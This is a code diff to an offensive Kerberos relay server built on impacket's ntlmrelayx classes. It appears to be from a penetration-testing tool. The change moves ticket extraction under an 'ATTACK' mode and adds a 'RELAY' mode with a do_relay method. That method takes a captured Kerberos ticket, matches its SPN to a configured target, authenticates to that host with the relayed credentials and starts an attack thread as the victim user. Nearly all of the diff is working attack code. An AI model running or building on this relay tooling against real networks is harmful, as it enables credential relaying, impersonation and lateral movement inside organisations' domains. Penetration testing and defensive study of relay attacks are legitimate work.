@@ -16,7 +16,7 @@ from impacket import ntlm, LOG
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.examples.ntlmrelayx.servers import HTTPRelayServer
-from lib.utils.kerberos import get_kerberos_loot
+from lib.utils.kerberos import get_kerberos_loot, get_auth_data
 
 class HTTPKrbRelayServer(HTTPRelayServer):
     """
@@ -75,14 +75,19 @@ class HTTPKrbRelayServer(HTTPRelayServer):
             if b'NTLMSSP' in token:
                 LOG.info('HTTPD: Client %s is using NTLM authentication instead of Kerberos' % self.client_address[0])
                 return
-            # If you're looking for the magic, it's in lib/utils/kerberos.py
-            authdata = get_kerberos_loot(token, self.server.config)
 
-            # If we are here, it was succesful
-
-            # Are we in attack mode? If so, launch attack against all targets
             if self.server.config.mode == 'ATTACK':
+                # Are we in attack mode? If so, launch attack against all targets
+                # If you're looking for the magic, it's in lib/utils/kerberos.py
+                authdata = get_kerberos_loot(token, self.server.config)
+                # If we are here, it was succesful
                 self.do_attack(authdata)
+
+            if self.server.config.mode == 'RELAY':
+                # If you're looking for the magic, it's in lib/utils/kerberos.py
+                authdata = get_auth_data(token, self.server.config)
+                self.do_relay(authdata)
+
 
             self.send_response(207, "Multi-Status")
             self.send_header('Content-Type', 'application/xml')
@@ -133,14 +138,18 @@ class HTTPKrbRelayServer(HTTPRelayServer):
             if b'NTLMSSP' in token:
                 LOG.info('HTTPD: Client %s is using NTLM authentication instead of Kerberos' % self.client_address[0])
                 return
-            # If you're looking for the magic, it's in lib/utils/kerberos.py
-            authdata = get_kerberos_loot(token, self.server.config)
-
-            # If we are here, it was succesful
-
-            # Are we in attack mode? If so, launch attack against all targets
+            
             if self.server.config.mode == 'ATTACK':
+                # Are we in attack mode? If so, launch attack against all targets
+                # If you're looking for the magic, it's in lib/utils/kerberos.py
+                authdata = get_kerberos_loot(token, self.server.config)
+                # If we are here, it was succesful
                 self.do_attack(authdata)
+
+            if self.server.config.mode == 'RELAY':
+                # If you're looking for the magic, it's in lib/utils/kerberos.py
+                authdata = get_auth_data(token, self.server.config)
+                self.do_relay(authdata)
 
             # And answer 404 not found
             self.send_response(404)
@@ -166,3 +175,21 @@ class HTTPKrbRelayServer(HTTPRelayServer):
                     client_thread.start()
                 else:
                     LOG.error('No attack configured for %s', parsed_target.scheme.upper())
+
+        def do_relay(self, authdata):
+            self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
+            sclass, host = authdata['service'].split('/')
+            for target in self.server.config.target.originalTargets:
+                parsed_target = target
+                if host.lower() in parsed_target.hostname.lower():
+                    # Found a target with the same SPN
+                    client = self.server.config.protocolClients[target.scheme.upper()](self.server.config, parsed_target)
+                    if not client.initConnection(authdata, self.server.config.dcip):
+                        return
+                    # We have an attack.. go for it
+                    attack = self.server.config.attacks[parsed_target.scheme.upper()]
+                    client_thread = attack(self.server.config, client.session, self.authUser)
+                    client_thread.start()
+                    return
+            # Still here? Then no target was found matching this SPN
+            LOG.error('No target configured that matches the hostname of the SPN in the ticket: %s', parsed_target.netloc.lower())
